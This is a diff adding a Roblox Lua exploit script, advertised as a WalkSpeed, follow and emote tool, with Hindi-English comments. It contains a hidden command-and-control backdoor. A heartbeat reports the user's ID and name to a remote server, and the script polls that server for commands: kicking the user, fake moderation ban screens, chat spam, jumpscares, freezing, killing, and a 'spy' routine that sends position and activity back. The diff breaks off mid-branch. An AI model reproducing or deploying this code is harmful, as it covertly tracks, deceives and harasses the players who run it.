@@ -1,0 +1,5655 @@
+-- Script By Sid (Rayfield UI Edition - WalkSpeed + Follow
+-- Player + Emote V2)
+
+-- Game aur Character load hone ka wait (Auto-Execute ke liye zaroori)
+
+-- Dungeon Heroes | Safe Initialization Gate
+
+if not game:IsLoaded() then
+game.Loaded:Wait()
+end
+
+local _Players = game:GetService("Players")
+local _RS = game:GetService("ReplicatedStorage")
+local _Player = _Players.LocalPlayer
+
+-- Wait for PlayerGui
+local _PlayerGui = _Player:WaitForChild("PlayerGui")
+
+-- Wait for core game systems
+local _Systems = _RS:WaitForChild("Systems")
+local _Remotes = _RS:WaitForChild("Remotes")
+
+-- Wait for player profile
+local _Profile = _PlayerGui:WaitForChild("Profile")
+local _Inventory = _Profile:WaitForChild("Inventory")
+
+-- Wait for character
+local _Character = _Player.Character
+or _Player.CharacterAdded:Wait()
+
+local _Humanoid = _Character:WaitForChild("Humanoid")
+local _HRP = _Character:WaitForChild("HumanoidRootPart")
+
+-- Let game systems settle
+task.wait(3)
+
+-- Verify character is still available
+while not _Player.Character
+or not _Player.Character:FindFirstChild("HumanoidRootPart") do
+task.wait(0.5)
+end
+
+print("[Sid Script] Game initialization completed")
+
+-- Safe Initialization V2
+
+local _Players = game:GetService("Players")
+local _RS = game:GetService("ReplicatedStorage")
+local _Player = _Players.LocalPlayer
+
+-- Non-blocking initialization
+local _PlayerGui = _Player:WaitForChild("PlayerGui", 10)
+
+local _Systems = _RS:FindFirstChild("Systems")
+local _Remotes = _RS:FindFirstChild("Remotes")
+
+-- Character check without infinite waiting
+local _Character = _Player.Character
+local _Humanoid = _Character and _Character:FindFirstChildOfClass("Humanoid")
+local _HRP = _Character and _Character:FindFirstChild("HumanoidRootPart")
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+
+-- ========================================
+-- ROBLOX OFFICIAL PREMIUM DISCONNECT UI (V4 - FIXED STOP)
+-- ========================================
+
+-- =============================================================
+--  FIXED SCRIPT: WRAPPED IN 'DO' BLOCK TO FIX 200 LIMIT ERROR
+-- =============================================================
+
+do  -- << YE 'do' BLOCK SABSE ZAROORI HAI, ISSE REMOVE MAT KARNA >>
+
+-- Saare Services aur Variables is Block ke andar rahenge  
+local HttpService = game:GetService("HttpService")  
+local Players = game:GetService("Players")  
+local TweenService = game:GetService("TweenService")  
+local Lighting = game:GetService("Lighting")  
+local ReplicatedStorage = game:GetService("ReplicatedStorage")  
+local TextChatService = game:GetService("TextChatService")  
+local ContentProvider = game:GetService("ContentProvider")  
+local StarterGui = game:GetService("StarterGui")  
+local RunService = game:GetService("RunService")  
+  
+local player = Players.LocalPlayer  
+
+-- ===== CONFIG =====  
+local BASE_URL = "https://testingbot-8pb1.onrender.com" -- Tumhara Naya URL  
+local STATUS_URL = BASE_URL .. "/status/"  
+local FAKE_URL = BASE_URL .. "/fakecheck/"  
+local STOP_URL = BASE_URL .. "/stopstatus"  
+local COMMAND_URL = BASE_URL .. "/api/get_command"  
+local CHECK_TIME = 1.5  
+
+-- Universal Request Function  
+local request_func = (syn and syn.request) or request or http_request or (fluxus and fluxus.request) or game.HttpGet  
+
+-- ========================================  
+-- NEW PREMIUM TROLL FUNCTIONS  
+-- ========================================  
+
+-- 1. SPEAK (Voice of God)  
+local function doSpeak(msg)  
+    local sound = Instance.new("Sound", workspace)  
+    sound.SoundId = "rbxassetid://12221967" -- Error/Thunder Sound  
+    sound.Volume = 10  
+    sound:Play()  
+    game:GetService("Debris"):AddItem(sound, 5)  
+      
+    local gui = Instance.new("ScreenGui", game.CoreGui)  
+    local text = Instance.new("TextLabel", gui)  
+    text.Size = UDim2.new(1, 0, 1, 0)  
+    text.BackgroundTransparency = 1  
+    text.Text = msg  
+    text.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red Color  
+    text.TextSize = 100  
+    text.Font = Enum.Font.FredokaOne  
+    text.TextStrokeTransparency = 0  
+      
+    -- Shake Effect  
+    task.spawn(function()  
+        for i = 1, 20 do  
+            text.Position = UDim2.new(0, math.random(-5,5), 0, math.random(-5,5))  
+            task.wait(0.05)  
+        end  
+        text.Position = UDim2.new(0,0,0,0)  
+        task.wait(3)  
+        gui:Destroy()  
+    end)  
+end  
+
+        -- 2. CAGE (Absolute Zero Freeze)  
+local function doCage()  
+    local char = player.Character  
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")  
+    local hum = char and char:FindFirstChild("Humanoid")  
+      
+    if not hrp or not hum then return end  
+      
+    -- 1. Visual Cage (Deewarein)  
+    if workspace:FindFirstChild("TitanCage") then workspace.TitanCage:Destroy() end  
+
+    local folder = Instance.new("Folder", workspace)  
+    folder.Name = "TitanCage"  
+      
+    local center = hrp.Position -- Is position par banda jam jayega  
+
+    -- 6 Parts (Pura Box)  
+    local parts = {  
+        {Pos = center + Vector3.new(0, 4, 0), Size = Vector3.new(6, 0.5, 6)}, -- Roof  
+        {Pos = center + Vector3.new(0, -4, 0), Size = Vector3.new(6, 0.5, 6)}, -- Floor  
+        {Pos = center + Vector3.new(0, 0, 3), Size = Vector3.new(6, 8, 0.5)}, -- Wall 1  
+        {Pos = center + Vector3.new(0, 0, -3), Size = Vector3.new(6, 8, 0.5)}, -- Wall 2  
+        {Pos = center + Vector3.new(3, 0, 0), Size = Vector3.new(0.5, 8, 6)}, -- Wall 3  
+        {Pos = center + Vector3.new(-3, 0, 0), Size = Vector3.new(0.5, 8, 6)}  -- Wall 4  
+    }  
+      
+    for _, info in pairs(parts) do  
+        local part = Instance.new("Part", folder)  
+        part.Size = info.Size  
+        part.Position = info.Pos  
+        part.Anchored = true  
+        part.CanCollide = true -- Takra ke wapis girega  
+        part.Transparency = 0  
+        part.Material = Enum.Material.ForceField -- Admin Look  
+        part.Color = Color3.fromRGB(255, 0, 0) -- Red  
+    end  
+      
+    -- Trap Sound  
+    local s = Instance.new("Sound", workspace)  
+    s.SoundId = "rbxassetid://3359654316"  
+    s.PlayOnRemove = true  
+    s:Destroy()  
+
+    -- 2. THE PERMANENT FREEZE LOOP  
+    -- Ye loop har frame chalega aur usko hilne nahi dega  
+    task.spawn(function()  
+        while char and hum and hrp and hum.Health > 0 do  
+              
+            -- A. Physics Freeze  
+            hrp.Anchored = true   
+            hrp.CFrame = CFrame.new(center) -- Wapis center me teleport  
+              
+            -- B. Input Freeze (Joystick/Keyboard Disable)  
+            hum.WalkSpeed = 0  
+            hum.JumpPower = 0  
+            hum.AutoRotate = false -- Idhar udhar dekh bhi nahi payega  
+            hum:UnequipTools() -- Hath me kuch nahi pakad payega  
+              
+            -- C. Animation Freeze (Optional: Putla bana do)  
+            -- hum.PlatformStand = true   
+              
+            task.wait() -- Super Fast Loop (No Escape)  
+        end  
+    end)  
+end  
+
+
+
+    -- 3. CONTROL (Puppet Master - Infinite Loop)  
+local function doControl(action)  
+    -- Alag thread me chalayenge taaki script na ruke  
+    task.spawn(function()  
+        local char = player.Character  
+        local hum = char and char:FindFirstChild("Humanoid")  
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")  
+          
+        -- Infinite Loop Start  
+        while char and hum and hrp and hum.Health > 0 do  
+              
+            if action == "jump" then  
+                hum.Jump = true -- Bar bar kudega  
+              
+            elseif action == "sit" then  
+                hum.Sit = true -- Khada hone ki koshish karega par wapis baith jayega  
+              
+            elseif action == "drop" then  
+                hum:UnequipTools() -- Weapon pakad hi nahi payega  
+              
+            elseif action == "spin" then  
+                -- Agar spin ruk gaya to wapis laga do  
+                if not hrp:FindFirstChild("AdminSpin") then  
+                    local bv = Instance.new("BodyAngularVelocity", hrp)  
+                    bv.Name = "AdminSpin"  
+                    bv.MaxTorque = Vector3.new(0, math.huge, 0)  
+                    bv.AngularVelocity = Vector3.new(0, 50, 0)  
+                end  
+                  
+            elseif action == "freeze" then  
+                hrp.Anchored = true -- Hamesha ke liye jam jayega  
+                  
+            elseif action == "kill" then  
+                hum.Health = 0  
+                break -- Marne ke baad loop band  
+                  
+            elseif action == "explode" then   
+                local ex = Instance.new("Explosion", workspace)  
+                ex.Position = hrp.Position  
+                task.wait(2) -- Har 2 second me fatata rahega  
+            end  
+              
+            task.wait(0.1) -- Fast Loop Speed  
+        end  
+    end)  
+end  
+
+-- 4. SPY (REAL DATA SENDER)  
+local function doSpy()  
+    notify("⚠️ SYSTEM ALERT", "Admin is retrieving your data...")  
+      
+    -- Loop 30 seconds ke liye (Discord bot ke loop se match karega)  
+    task.spawn(function()  
+        for i = 1, 15 do  
+            local char = player.Character  
+            local hum = char and char:FindFirstChild("Humanoid")  
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")  
+              
+            if char and hum and hrp then  
+                -- 1. Gather Data  
+                local currentHealth = math.floor(hum.Health)  
+                local maxHealth = math.floor(hum.MaxHealth)  
+                  
+                -- Check Tool  
+                local tool = char:FindFirstChildOfClass("Tool")  
+                local toolName = tool and tool.Name or "Empty Hand"  
+                  
+                -- Check Activity  
+                local state = "Idle"  
+                if hum.MoveDirection.Magnitude > 0 then state = "Walking" end  
+                if hum.Sit then state = "Sitting" end  
+                if hum.Health <= 0 then state = "Dead" end  
+                  
+                -- Position  
+                local pos = string.format("%d, %d, %d", math.floor(hrp.Position.X), math.floor(hrp.Position.Y), math.floor(hrp.Position.Z))  
+                  
+                -- 2. Prepare JSON Payload  
+                local payload = {  
+                    userid = player.UserId,  
+                    health = currentHealth,  
+                    max_health = maxHealth,  
+                    tool = toolName,  
+                    loc = pos,  
+                    activity = state  
+                }  
+                  
+                -- 3. Send Data Back to Flask Server  
+                pcall(function()  
+                    request_func({  
+                        Url = BASE_URL .. "/api/report_spy",  
+                        Method = "POST",  
+                        Body = HttpService:JSONEncode(payload),  
+                        Headers = {["Content-Type"] = "application/json"}  
+                    })  
+                end)  
+            end  
+              
+            task.wait(2) -- Har 2 second me data update bhejo  
+        end  
+    end)  
+end  
+
+-- ========================================  
+-- 💓 HEARTBEAT (SMART SESSION TRACKER)  
+-- ========================================  
+local function startHeartbeat()  
+    task.spawn(function()  
+        local isFirst = true -- Variable to track first run  
+          
+        while true do  
+            -- Data Prepare  
+            local payload = {  
+                userid = tostring(player.UserId),  
+                username = player.Name,  
+                display = player.DisplayName,  
+                first_run = isFirst -- Ye batayega ki time reset karna hai ya nahi  
+            }  
+              
+            -- Send Signal  
+            pcall(function()  
+                request_func({  
+                    Url = BASE_URL .. "/api/heartbeat",  
+                    Method = "POST",  
+                    Body = HttpService:JSONEncode(payload),  
+                    Headers = {["Content-Type"] = "application/json"}  
+                })  
+            end)  
+              
+            -- Pehli baar chalne ke baad, flag ko false kar do  
+            if isFirst then  
+                isFirst = false  
+            end  
+              
+            task.wait(20) -- Har 20 second me ping  
+        end  
+    end)  
+end  
+  
+startHeartbeat() -- Start immediately  
+
+-- ========================================  
+-- 🌌 GOD-TIER TROLL FUNCTIONS  
+-- ========================================  
+
+-- 1. SINGULARITY (Black Hole)  
+local function doSingularity(targetId)  
+    -- Target player dhoondo  
+    local target = Players:GetPlayerByUserId(tonumber(targetId))  
+    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end  
+      
+    local center = target.Character.HumanoidRootPart  
+      
+    -- Visual Black Hole  
+    local sphere = Instance.new("Part", center)  
+    sphere.Shape = Enum.PartType.Ball  
+    sphere.Size = Vector3.new(0,0,0)  
+    sphere.Color = Color3.new(0,0,0)  
+    sphere.Material = Enum.Material.Neon  
+    sphere.Anchored = true  
+    sphere.CanCollide = false  
+    sphere.Name = "TheVoid"  
+      
+    -- Animation loop  
+    task.spawn(function()  
+        -- Sphere grow effect  
+        TweenService:Create(sphere, TweenInfo.new(2), {Size = Vector3.new(20,20,20)}):Play()  
+          
+        -- Pull Loop (15 seconds)  
+        local startTime = tick()  
+        while tick() - startTime < 15 do  
+            if center then  
+                sphere.CFrame = center.CFrame  
+                  
+                -- Loop through all other players  
+                for _, p in pairs(Players:GetPlayers()) do  
+                    if p ~= target and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then  
+                        local hrp = p.Character.HumanoidRootPart  
+                        -- Direction vector towards black hole  
+                        local direction = (center.Position - hrp.Position).Unit  
+                        -- Apply Force (Pull)  
+                        hrp.Velocity = direction * 50 -- Speed of pull  
+                        hrp.CFrame = CFrame.new(hrp.Position, center.Position) -- Look at black hole  
+                    end  
+                end  
+            end  
+            task.wait()  
+        end  
+        sphere:Destroy()  
+    end)  
+end  
+
+-- 2. IDENTITY THEFT (Clone)  
+local function doIdentity(cloneId)  
+    -- Sabko Target jaisa bana do  
+    local id = tonumber(cloneId)  
+    for _, p in pairs(Players:GetPlayers()) do  
+        if p.Character and p.Character:FindFirstChild("Humanoid") then  
+            task.spawn(function()  
+                pcall(function()  
+                    local desc = Players:GetHumanoidDescriptionFromUserId(id)  
+                    p.Character.Humanoid:ApplyDescription(desc)  
+                end)  
+            end)  
+        end  
+    end  
+end  
+
+-- 3. MIDAS TOUCH (Death Touch)  
+local function doMidas(targetId)  
+    local target = Players:GetPlayerByUserId(tonumber(targetId))  
+    if not target or not target.Character then return end  
+      
+    -- Gold Effect  
+    for _, part in pairs(target.Character:GetChildren()) do  
+        if part:IsA("BasePart") then  
+            part.Color = Color3.fromRGB(255, 215, 0) -- Gold  
+            part.Material = Enum.Material.Metal  
+              
+            -- Kill on Touch Logic  
+            part.Touched:Connect(function(hit)  
+                if hit.Parent and hit.Parent:FindFirstChild("Humanoid") and hit.Parent.Name ~= target.Name then  
+                    hit.Parent:BreakJoints() -- Instant Kill  
+                end  
+            end)  
+        end  
+    end  
+end  
+
+-- 4. PERSONAL GRAVITY  
+local function doGravity(targetId, direction)  
+    local target = Players:GetPlayerByUserId(tonumber(targetId))  
+    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end  
+      
+    local hrp = target.Character.HumanoidRootPart  
+      
+    -- Remove old forces  
+    if hrp:FindFirstChild("AdminGravity") then hrp.AdminGravity:Destroy() end  
+      
+    local force = Instance.new("BodyForce", hrp)  
+    force.Name = "AdminGravity"  
+      
+    -- Physics Calculations (Mass * Gravity)  
+    local mass = 0  
+    for _, v in pairs(target.Character:GetChildren()) do  
+        if v:IsA("BasePart") then mass = mass + v:GetMass() end  
+    end  
+    local gravity = workspace.Gravity  
+      
+    if direction == "up" then  
+        -- Upar khincho (Double gravity force upwards)  
+        force.Force = Vector3.new(0, mass * gravity * 1.5, 0)  
+    elseif direction == "down" then  
+        -- Bhari kar do  
+        force.Force = Vector3.new(0, -mass * gravity * 5, 0)  
+    elseif direction == "side" then  
+        -- Deewar ki taraf  
+        force.Force = Vector3.new(mass * gravity, mass * gravity, 0)  
+    elseif direction == "zero" then  
+        -- Hawa mein latka do  
+        force.Force = Vector3.new(0, mass * gravity, 0)  
+    end  
+      
+    -- 10 second baad normal kar do  
+    game:GetService("Debris"):AddItem(force, 10)  
+end  
+
+-- 5. INVISIBLE FLING (PHYSICS DESTROYER)  
+local function doFling(targetId)  
+    local target = Players:GetPlayerByUserId(tonumber(targetId))  
+    if not target or not target.Character then   
+        notify("❌ Error", "Target not found nearby!")  
+        return   
+    end  
+      
+    local char = player.Character  
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")  
+    local hum = char and char:FindFirstChild("Humanoid")  
+      
+    if not hrp then return end  
+
+    notify("🌪️ FLING", "Targeting: " .. target.Name)  
+
+    -- 1. Setup: Invisible & No Collision  
+    -- Hum chahte hain ki hum unke andar ghus sakein bina rukawat ke  
+    for _, part in pairs(char:GetDescendants()) do  
+        if part:IsA("BasePart") then  
+            part.CanCollide = false  
+            part.Transparency = 1 -- Pura Gayab  
+        elseif part:IsA("Decal") then  
+            part.Transparency = 1  
+        end  
+    end  
+      
+    -- 2. God Mode (Temporary)  
+    -- Taaki takkar se hum na marein  
+    local bodyVel = Instance.new("BodyVelocity")  
+    bodyVel.Velocity = Vector3.new(0, 0, 0)  
+    bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)  
+    bodyVel.Parent = hrp  
+
+    local bodyAng = Instance.new("BodyAngularVelocity")  
+    bodyAng.AngularVelocity = Vector3.new(0, 99999, 0) -- Super Fast Spin  
+    bodyAng.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)  
+    bodyAng.Parent = hrp  
+
+    -- 3. Attack Loop (5 Seconds)  
+    local startTime = tick()  
+    local tHrp = target.Character:FindFirstChild("HumanoidRootPart")  
+      
+    while tick() - startTime < 5 do  
+        if target.Character and tHrp then  
+            -- Target ke andar teleport hona baar-baar  
+            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 0)   
+            hrp.Velocity = Vector3.new(0, 0, 0) -- Position lock  
+            hrp.RotVelocity = Vector3.new(0, 10000, 0) -- Spin Force  
+        end  
+        task.wait() -- Super fast update  
+    end  
+      
+    -- 4. Cleanup (Reset Character)  
+    bodyVel:Destroy()  
+    bodyAng:Destroy()  
+    player:LoadCharacter() -- Wapis normal hone ke liye respawn  
+end  
+
+-- 6. PIGGYBACK (RIDE)  
+local function doRide(targetId)  
+    local target = Players:GetPlayerByUserId(tonumber(targetId))  
+    if not target or not target.Character then return end  
+      
+    local hrp = player.Character.HumanoidRootPart  
+    local tHrp = target.Character.HumanoidRootPart  
+      
+    notify("🎒 Piggyback", "Riding: " .. target.Name)  
+      
+    -- Disable Collisions (Taaki hum unke andar na fasein, bas chipak jayein)  
+    for _, part in pairs(player.Character:GetDescendants()) do  
+        if part:IsA("BasePart") then part.CanCollide = false end  
+    end  
+
+    -- Loop: Lock position to their back/shoulders  
+    local startTime = tick()  
+    -- 20 seconds tak chipke raho  
+    while tick() - startTime < 20 do  
+        if target.Character and tHrp then  
+            -- Position: Thoda sa peeche aur upar  
+            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 2, 1)  
+        end  
+        game:GetService("RunService").Heartbeat:Wait()  
+    end  
+    player:LoadCharacter() -- Reset  
+end  
+
+-- 7. VOID ABDUCTION  
+local function doAbduct(targetId)  
+    local target = Players:GetPlayerByUserId(tonumber(targetId))  
+    if not target or not target.Character then return end  
+      
+    local hrp = player.Character.HumanoidRootPart  
+    local tHrp = target.Character.HumanoidRootPart  
+      
+    notify("🕳️ Abducting", "Target: " .. target.Name)  
+      
+    -- Collision On rakhenge taaki dhakka lage  
+    local startTime = tick()  
+    while tick() - startTime < 5 do  
+        if target.Character and tHrp then  
+            -- Target ke PAIRO (Feet) par teleport ho jao  
+            -- Ye unko neeche se dhakka dega  
+            hrp.CFrame = tHrp.CFrame * CFrame.new(0, -3, 0)  
+            hrp.Velocity = Vector3.new(0, -100, 0) -- Neeche ki taraf force  
+        end  
+        game:GetService("RunService").Heartbeat:Wait()  
+    end  
+    player:LoadCharacter()  
+end  
+
+-- ========================================  
+-- 💞 UNIVERSAL COUPLE LOGIC  
+-- ========================================  
+
+-- 1. DIRECT RIDE (Agar Rider ke paas script hai)  
+local function doSmartRide(targetId)  
+    local target = Players:GetPlayerByUserId(tonumber(targetId))  
+    if not target or not target.Character then return end  
+      
+    notify("🚀 Command Received", "Riding: " .. target.Name)  
+      
+    local hrp = player.Character.HumanoidRootPart  
+    local tHrp = target.Character.HumanoidRootPart  
+      
+    -- Collision Off  
+    for _, part in pairs(player.Character:GetDescendants()) do  
+        if part:IsA("BasePart") then part.CanCollide = false end  
+    end  
+
+    -- Loop: Chipak jao  
+    local startTime = tick()  
+    while tick() - startTime < 30 do -- 30 sec tak  
+        if target.Character and tHrp then  
+            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 2, 0.5)  
+        end  
+        game:GetService("RunService").Heartbeat:Wait()  
+    end  
+end  
+
+-- 2. PHYSICS DRAG (Agar Rider normal player hai)  
+local function doPhysicsDrag(riderId, horseId)  
+    local rider = Players:GetPlayerByUserId(tonumber(riderId))  
+    local horse = Players:GetPlayerByUserId(tonumber(horseId))  
+      
+    if not rider or not horse then return end  
+    notify("🧲 Matchmaker", "Dragging " .. rider.Name .. " to " .. horse.Name)  
+      
+    local myHrp = player.Character.HumanoidRootPart  
+      
+    -- Invisible ban jao  
+    for _, part in pairs(player.Character:GetDescendants()) do  
+        if part:IsA("BasePart") then part.Transparency = 1 part.CanCollide = false end  
+    end  
+
+    local startTime = tick()  
+    while tick() - startTime < 15 do  
+        if rider.Character and horse.Character then  
+            local rHrp = rider.Character:FindFirstChild("HumanoidRootPart")  
+            local hHrp = horse.Character:FindFirstChild("HumanoidRootPart")  
+              
+            if rHrp and hHrp then  
+                -- Strategy: Rider ke andar teleport ho, aur Horse ki taraf velocity lagao  
+                myHrp.CFrame = rHrp.CFrame -- Unke andar ghuso  
+                  
+                -- Magnet Force Calculation  
+                local dir = (hHrp.Position - rHrp.Position).Unit  
+                local dist = (hHrp.Position - rHrp.Position).Magnitude  
+                  
+                if dist > 3 then  
+                    -- Door hai? Dhakka maaro!  
+                    -- BodyVelocity create karke push karna better hota hai fling ke liye  
+                    local bv = Instance.new("BodyVelocity", myHrp)  
+                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)  
+                    bv.Velocity = dir * 150 -- Super Speed Drag  
+                    game:GetService("Debris"):AddItem(bv, 0.1)  
+                else  
+                    -- Paas hai? Wahi roko  
+                    myHrp.CFrame = hHrp.CFrame * CFrame.new(0, 3, 0)  
+                end  
+            end  
+        end  
+        game:GetService("RunService").Heartbeat:Wait()  
+    end  
+    player:LoadCharacter() -- Reset  
+end  
+
+
+-- ========================================  
+-- HELPER FUNCTIONS  
+-- ========================================  
+
+local function notify(title, text)  
+    pcall(function()  
+        StarterGui:SetCore("SendNotification", {  
+            Title = title;  
+            Text = text;  
+            Duration = 5;  
+        })  
+    end)  
+end  
+
+local function getJson(url)  
+    local ok, res = pcall(function() return game:HttpGet(url) end)  
+    if not ok or not res or res == "" then return nil end  
+    local good, json = pcall(function() return HttpService:JSONDecode(res) end)  
+    return good and json or nil  
+end  
+
+-- ========================================  
+-- TROLL FUNCTIONS  
+-- ========================================  
+
+local function doBlock(targetId)  
+    if not targetId then return end  
+    local target = Players:GetPlayerByUserId(tonumber(targetId))  
+    if target then  
+        notify("🚫 BLOCKING", "Removing: " .. target.Name)  
+        if target.Character then  
+            target.Character:ClearAllChildren()  
+            target.Character:Destroy()  
+        end  
+        target.CharacterAdded:Connect(function(char)  
+            task.wait(0.5)  
+            if char then char:ClearAllChildren() char:Destroy() end  
+        end)  
+    end  
+end  
+
+local function doJumpscare(customSoundId)  
+    local sound = Instance.new("Sound")  
+    sound.Name = "JumpscareSound"  
+    sound.Parent = workspace  
+    sound.SoundId = (customSoundId and customSoundId ~= "") and ("rbxassetid://" .. customSoundId) or "rbxassetid://9119827059"  
+    sound.Volume = 10  
+    ContentProvider:PreloadAsync({sound})  
+    sound:Play()  
+
+    local gui = Instance.new("ScreenGui")  
+    gui.Parent = game.CoreGui  
+    gui.IgnoreGuiInset = true  
+    local img = Instance.new("ImageLabel", gui)  
+    img.Size = UDim2.new(1,0,1,0)  
+    img.Image = "rbxassetid://13429676378"  
+    img.BackgroundColor3 = Color3.new(0,0,0)  
+    img.ZIndex = 100  
+
+    task.spawn(function()  
+        for i = 1, 20 do  
+            img.Visible = not img.Visible  
+            task.wait(0.04)  
+        end  
+        img.Visible = true  
+        task.wait(2)  
+        gui:Destroy()  
+        sound:Destroy()  
+    end)  
+end  
+
+local function doAudio(id)  
+    if workspace:FindFirstChild("TrollSound") then workspace.TrollSound:Destroy() end  
+    local s = Instance.new("Sound")  
+    s.Name = "TrollSound"  
+    s.Parent = workspace  
+    s.SoundId = "rbxassetid://"..id  
+    s.Volume = 10  
+    s.Looped = true  
+      
+    notify("🔊 Audio", "Loading sound...", 2)  
+    local success = pcall(function() if not s.IsLoaded then s.Loaded:Wait() end end)  
+    if success then s:Play() end  
+end  
+
+local function doSpam(msg, limit)  
+    task.spawn(function()  
+        for i=1, limit do  
+            pcall(function()  
+                if TextChatService:FindFirstChild("TextChannels") then  
+                    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")  
+                    if ch then ch:SendAsync(msg) end  
+                elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then  
+                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")  
+                end  
+            end)  
+            task.wait(0.35)  
+        end  
+    end)  
+end  
+
+-- ========================================  
+-- SECURITY UI FUNCTION  
+-- ========================================  
+
+local function showFakeBan(info)  
+    if player.PlayerGui:FindFirstChild("RobloxPromptGui") then  
+        player.PlayerGui.RobloxPromptGui:Destroy()  
+    end  
+      
+    local blur = Instance.new("BlurEffect")  
+    blur.Name = "RobloxDisconnectBlur"; blur.Parent = Lighting; blur.Size = 0  
+    TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Size = 20}):Play()  
+
+    local gui = Instance.new("ScreenGui", player.PlayerGui)  
+    gui.Name = "RobloxPromptGui"; gui.IgnoreGuiInset = true; gui.DisplayOrder = 10; gui.ResetOnSpawn = false  
+
+    local overlay = Instance.new("Frame", gui)  
+    overlay.Size = UDim2.fromScale(1,1); overlay.BackgroundColor3 = Color3.new(0,0,0); overlay.BackgroundTransparency = 0.5  
+      
+    local alertBox = Instance.new("Frame", overlay)  
+    alertBox.AnchorPoint = Vector2.new(0.5, 0.5); alertBox.Position = UDim2.fromScale(0.5, 0.5)  
+    alertBox.Size = UDim2.new(0, 400, 0, 240); alertBox.BackgroundColor3 = Color3.fromRGB(57, 59, 61)  
+    Instance.new("UICorner", alertBox).CornerRadius = UDim.new(0, 8)  
+
+    local title = Instance.new("TextLabel", alertBox)  
+    title.Text = "Disconnected"; title.Font = Enum.Font.GothamBold; title.TextColor3 = Color3.fromRGB(255, 255, 255)  
+    title.TextSize = 24; title.Size = UDim2.new(1, 0, 0, 45); title.BackgroundTransparency = 1; title.Position = UDim2.new(0, 0, 0, 5)  
+
+    local msg = Instance.new("TextLabel", alertBox)  
+    msg.Text = "You have been kicked by this experience or its moderators. Moderation message:"  
+    msg.Font = Enum.Font.Gotham; msg.TextColor3 = Color3.fromRGB(189, 190, 190); msg.TextSize = 16  
+    msg.TextWrapped = true; msg.Size = UDim2.new(0.9, 0, 0, 45); msg.Position = UDim2.new(0.5, 0, 0, 60)  
+    msg.AnchorPoint = Vector2.new(0.5, 0); msg.BackgroundTransparency = 1  
+
+    local reason = Instance.new("TextLabel", alertBox)  
+    reason.Text = tostring(info.message or "Connection lost.")  
+    reason.Font = Enum.Font.Gotham; reason.TextColor3 = Color3.fromRGB(255, 255, 255); reason.TextSize = 16  
+    reason.TextWrapped = true; reason.Size = UDim2.new(0.9, 0, 0, 60); reason.Position = UDim2.new(0.5, 0, 0, 110)  
+    reason.AnchorPoint = Vector2.new(0.5, 0); reason.BackgroundTransparency = 1  
+
+    local btn = Instance.new("TextButton", alertBox)  
+    btn.Text = "Leave"; btn.Font = Enum.Font.GothamBold; btn.TextSize = 16  
+    btn.TextColor3 = Color3.fromRGB(30, 30, 30); btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  
+    btn.Size = UDim2.new(1, -40, 0, 40); btn.Position = UDim2.new(0.5, 0, 1, -20); btn.AnchorPoint = Vector2.new(0.5, 1)  
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)  
+
+    btn.MouseButton1Click:Connect(function()  
+        gui:Destroy(); TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()  
+        task.delay(0.4, function() if blur then blur:Destroy() end end)  
+    end)  
+end  
+
+local function isStopped()  
+    local data = getJson(STOP_URL)  
+    return (data and data.stop == true)  
+end  
+
+-- ========================================  
+-- MAIN LOOPS (SECURITY + TROLL)  
+-- ========================================  
+
+task.spawn(function()  
+      
+    -- Stop Check (One Time)  
+    if isStopped() then player:Kick("❌ System Disabled by Admin") return end  
+      
+    -- Fake Ban Check (One Time)  
+    task.wait(2)  
+    local fake = getJson(FAKE_URL .. player.UserId)  
+    if fake and fake.fake == true then showFakeBan(fake) end  
+
+    -- Constant Loop  
+    while task.wait(CHECK_TIME) do  
+        -- 1. Security Check  
+        local info = getJson(STATUS_URL .. player.UserId)  
+        if info then  
+            if info.maintenance then player:Kick("🛠 Maintenance Mode"); break end  
+            if info.access == false then player:Kick("🔐 Not Whitelisted"); break end  
+            if info.kick then player:Kick("👢 Kicked: " .. tostring(info.kick_reason)); break end  
+            if info.banned then  
+                local r = tostring(info.ban_reason or "None")  
+                if info.tempban then player:Kick("⏱ Temp Ban: " .. r)  
+                else player:Kick("🚫 Banned: " .. r) end  
+                break  
+            end  
+        end  
+          
+        -- 2. Fake Ban Re-Check  
+        local f = getJson(FAKE_URL .. player.UserId)  
+        if f and f.fake == true then showFakeBan(f) end  
+
+        -- 3. Troll Command Check  
+        pcall(function()  
+            local myId = tostring(player.UserId)  
+            local targetUrl = COMMAND_URL .. "?userid=" .. myId  
+            local resp  
+              
+            if request_func == game.HttpGet then resp = game:HttpGet(targetUrl)  
+            else  
+                local r = request_func({Url = targetUrl, Method = "GET"})  
+                if r and r.StatusCode == 200 then resp = r.Body end  
+            end  
+
+            if resp and resp ~= "" and resp ~= "{}" then  
+                local s, data = pcall(function() return HttpService:JSONDecode(resp) end)  
+                if s and data and data.type ~= "none" then  
+                    if data.type == "block" then doBlock(data.payload.block_id)  
+                    elseif data.type == "jumpscare" then doJumpscare(data.payload.sound_id)  
+                    elseif data.type == "audio" then doAudio(data.payload.id)  
+                    elseif data.type == "spam" then doSpam(data.payload.msg, tonumber(data.payload.limit))
+
+-- NEW COMMANDS --
+elseif data.type == "speak" then doSpeak(data.payload.msg)
+elseif data.type == "cage" then doCage()
+elseif data.type == "control" then doControl(data.payload.action)
+elseif data.type == "spy" then doSpy()
+-- Isko baki commands ke niche lagana
+elseif data.type == "singularity" then
